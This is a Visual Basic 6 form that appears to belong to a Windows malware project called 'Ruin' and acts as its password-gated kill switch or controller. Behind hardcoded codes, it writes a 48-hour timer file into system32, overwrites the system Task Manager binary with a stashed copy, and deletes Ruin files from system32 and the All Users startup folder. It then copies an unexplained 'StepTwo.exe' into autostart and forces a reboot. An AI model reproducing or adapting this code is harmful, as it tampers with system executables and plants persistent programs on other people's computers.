VERSION 5.00
Begin VB.Form Killer 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Killing Ruin"
   ClientHeight    =   1545
   ClientLeft      =   5325
   ClientTop       =   5265
   ClientWidth     =   3390
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1545
   ScaleWidth      =   3390
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   240
      Top             =   960
   End
   Begin VB.CommandButton cmdkll 
      Caption         =   "Kill"
      Height          =   375
      Left            =   2280
      TabIndex        =   0
      Top             =   960
      Width           =   855
   End
   Begin VB.Label Label1 
      Caption         =   "Welcom Ruin-Kill"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   240
      Width           =   1335
   End
End
Attribute VB_Name = "Killer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Public code As String
Dim dirc As String
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal IpBuffer As String, ByVal nSize As Long) As Long
Private Sub cmdkll_Click()
1:
Passwrd.Show vbModal
If Passwrd.txtcd = "701352" Then Days: GoTo 2
If Passwrd.txtcd = "952364512450210451102354" Then Olready: GoTo 2
If Passwrd.txtcd = "" Then GoTo 2
GoTo 1
2:
Unload Killer
Unload Passwrd
3:
End Sub
Private Sub Days()
Dim IngRtn As Long
Const MAXWINPATH = 144
dirc = Space(MAXWINPATH)
IngRtn = GetWindowsDirectory(dirc, MAXWINPATH)
dirc = Left(dirc, IngRtn)  ' отсекаем лишнее
Open dirc & "\system32\RuinVak" For Binary As #1
Put #1, , Now + TimeSerial(48, 0, 0)
Close #1
MsgBox "On 2 days Ruin is dead", 0, "Information"
End Sub
Private Sub Form_Load()
Timer1.Enabled = False
End Sub

Private Sub Olready()
Dim c As String
cmdkll.Enabled = False
Label1.Visible = False
Dim strFileName As String
Dim IngRtn As Long
Const MAXWINPATH = 144
dirc = Space(MAXWINPATH)
IngRtn = GetWindowsDirectory(dirc, MAXWINPATH)
dirc = Left(dirc, IngRtn)  ' отсекаем лишнее

strFileName = Dir(dirc & "\system32\")
Do While strFileName <> ""
If strFileName = "teskmgr.exe" Then Kill dirc & "\system32\taskmgr.exe": FileCopy dirc & "\system32\teskmgr.exe", dirc & "\system32\taskmgr.exe": Kill dirc & "\system32\teskmgr.exe"
strFileName = Dir
Loop

strFileName = Dir(dirc & "\system32\")
Do While strFileName <> ""
If strFileName = "Ruin.exe" Then Kill dirc & "\system32\Ruin.exe"
strFileName = Dir
Loop

strFileName = Dir(dirc & "\system32\")
Do While strFileName <> ""
If strFileName = "RuinVak" Then Kill dirc & "\system32\RuinVak"
strFileName = Dir
Loop

strFileName = Dir(Left(dirc, 3) & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\")
c = Left(dirc, 3)
Do While strFileName <> ""
If strFileName = "Ruin.exe" Then Kill c & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\Ruin.exe"
strFileName = Dir
Loop

strFileName = Dir(Left(dirc, 3) & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\")
c = Left(dirc, 3)
Do While strFileName <> ""
If strFileName = "critical.jpg" Then Kill c & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\critical.jpg"
strFileName = Dir
Loop

FileCopy App.Path & "\StepTwo.exe", c & "Documents and Settings\All Users\Главное меню\Программы\Автозагрузка\StepTwo.exe"
RestartWindows.Show vbModal
End Sub
